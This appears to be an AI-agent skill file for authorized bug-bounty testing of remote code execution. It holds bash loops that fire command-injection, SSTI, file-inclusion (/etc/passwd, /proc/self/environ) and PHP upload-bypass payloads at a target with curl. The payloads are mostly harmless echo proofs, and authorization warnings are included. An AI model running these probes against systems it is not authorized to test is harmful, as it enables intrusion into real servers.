---
name: bug-bounty-rce
description: Use for Remote Code Execution testing: command injection, unsafe deserialization, template injection, file inclusion, and RCE via file upload or parser vulnerabilities.
---

# Bug Bounty RCE Testing

**WARNING:** RCE testing is HIGH RISK. Only test with explicit authorization. Use safe proof-of-concepts only.

## Command Injection Discovery

```bash
target="example.com"
slug="$(printf '%s' "$target" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9._-]/_/g')"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"

# Identify injectable parameters
# Look for: cmd, exec, command, execute, ping, traceroute, system, shell, eval

# Test with safe payloads (NO reverse shells without explicit approval)
safe_payloads=(
    "id; echo RCE_TEST"
    "whoami && echo RCE_TEST"
    "| id"
    "$(echo RCE_TEST)"
    "`echo RCE_TEST`"
    "|| echo RCE_TEST"
)

for payload in "${safe_payloads[@]}"; do
    curl -sk "https://$target/ping?ip=127.0.0.1;$payload" | \
        grep -i "RCE_TEST" && echo "POTENTIAL RCE: $payload" >> "$BB_ROOT/vulns/rce-candidates.txt"
done
```

## Blind Command Injection

```bash
# Time-based detection (use sparingly)
time_payloads=(
    "sleep 5"
    "ping -c 5 127.0.0.1"
    "timeout 5"
)

for payload in "${time_payloads[@]}"; do
    start=$(date +%s)
    curl -sk "https://$target/ping?ip=127.0.0.1;$payload" > /dev/null
    end=$(date +%s)
    diff=$((end - start))
    [ $diff -ge 5 ] && echo "TIME-BASED RCE: $payload (took ${diff}s)" >> "$BB_ROOT/vulns/rce-blind.txt"
done
```

## Unsafe Deserialization

```bash
# Java deserialization markers
java_markers=(
    "\xac\xed\x00\x05"  # Serialization magic bytes
    "rO0"               # Base64 encoded serialized object
)

# Test with safe probe
curl -sk -X POST "https://$target/api/deserialize" \
    -H "Content-Type: application/octet-stream" \
    -d $'\xac\xed\x00\x05test' \
    -o "$BB_ROOT/vulns/deserialize-test.txt"

# Check for Java stack traces
grep -i "java\|serialization\|readObject" "$BB_ROOT/vulns/deserialize-test.txt"
```

## Server-Side Template Injection (SSTI)

```bash
# SSTI payloads by engine
ssti_payloads=(
    "{{7*7}}"                    # Jinja2, Twig
    "\${7*7}"                    # Java EL
    "#{7*7}"                     # JSF
    "<%=7*7%>"                   # Ruby ERB
    "{{=7*7}}"                   # Python TPL
    "*{7*7}"                     # Spring EL
    "{7*7}"                      # Freemarker
    "{{7*'7'}}"                  # Test string context
)

for payload in "${ssti_payloads[@]}"; do
    curl -sk "https://$target/search?q=$payload" | \
        grep -E "49|error|exception" && \
        echo "SSTI CANDIDATE: $payload" >> "$BB_ROOT/vulns/ssti-candidates.txt"
done
```

## File Inclusion (LFI/RFI)

```bash
# LFI payloads (safe, non-destructive)
lfi_payloads=(
    "/etc/passwd"
    "/etc/hosts"
    "/proc/self/environ"
    "/proc/version"
    "../../etc/passwd"
    "....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2fetc/passwd"  # URL encoded
)

for payload in "${lfi_payloads[@]}"; do
    curl -sk "https://$target/page?file=$payload" | \
        grep -E "root:|daemon:" && \
        echo "LFI FOUND: $payload" >> "$BB_ROOT/vulns/lfi-found.txt"
done
```

## RCE via File Upload

```bash
# Test file upload with safe payloads
# NEVER upload actual shells without explicit approval

# Test 1: Extension bypass
extensions=(".php5" ".phtml" ".php3" ".phps" ".phar" ".jpg.php" ".png.php")

for ext in "${extensions[@]}"; do
    echo "<?php echo 'RCE_TEST'; ?>" > "/tmp/test$ext"
    curl -sk -X POST "https://$target/upload" \
        -F "file=@/tmp/test$ext" \
        -F "submit=Upload" | \
        grep -i "uploaded\|success" && \
        echo "Upload accepted: $ext" >> "$BB_ROOT/vulns/upload-bypass.txt"
done

# Test 2: Content-Type bypass
curl -sk -X POST "https://$target/upload" \
    -F "file=@/tmp/test.php;type=image/jpeg" \
    -F "submit=Upload"
```

## Proof-of-Concept (Safe)

**APPROVAL REQUIRED** before running exploits. Safe proofs only:

```bash
# Safe RCE proof (no data exfiltration)
proof_payload="echo RCE_PROOF_$(date +%s)"

curl -sk "https://$target/ping?ip=127.0.0.1;$proof_payload" | \
    grep "RCE_PROOF" && echo "RCE CONFIRMED" >> "$BB_ROOT/vulns/rce-confirmed.txt"

# Document exact request/response
curl -sk -D "$BB_ROOT/vulns/rce-headers.txt" \
    -o "$BB_ROOT/vulns/rce-body.txt" \
    "https://$target/ping?ip=127.0.0.1;$proof_payload"
```

## RCE Tools

- `commix` - Automated command injection
- `gobuster` - Directory/API discovery
- `feroxbuster` - Content discovery
- `burpsuite` - Manual testing
- `nuclei` - RCE templates
- `metasploit` - **ONLY with explicit approval**

## Reporting RCE

**Severity: ALWAYS Critical**

```markdown
## Remote Code Execution

**Location:** https://target.com/ping?ip=
**Parameter:** ip
**Payload:** ; echo RCE_PROOF_12345
**Impact:** Full server compromise, data access, lateral movement

**Evidence:**
- Request: `vulns/rce-request-20260705-123456.txt`
- Response: `vulns/rce-response-20260705-123456.txt`
- Timestamp: 2026-07-05 12:34:56 UTC

**Remediation:**
- Input validation/sanitization
- Parameterized commands
- Web Application Firewall
- Principle of least privilege
```

## Safety Rules

1. **NEVER** run destructive commands (rm, dd, > /dev/null, etc.)
2. **NEVER** exfiltrate real data
3. **NEVER** install persistence/backdoors
4. **ALWAYS** use safe proof-of-concepts
5. **ALWAYS** document exact requests/responses
6. **GET APPROVAL** before exploit modules
## Output Convention

All commands must save output to organized paths:

```bash
ts="$(date +%Y%m%d-%H%M%S)"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"
# stdout -> $BB_ROOT/<phase>/<tool>-$ts.txt
# stderr -> $BB_ROOT/logs/<tool>-$ts.err
```

Never dump raw tool output into chat context. Save to files, then read targeted excerpts.
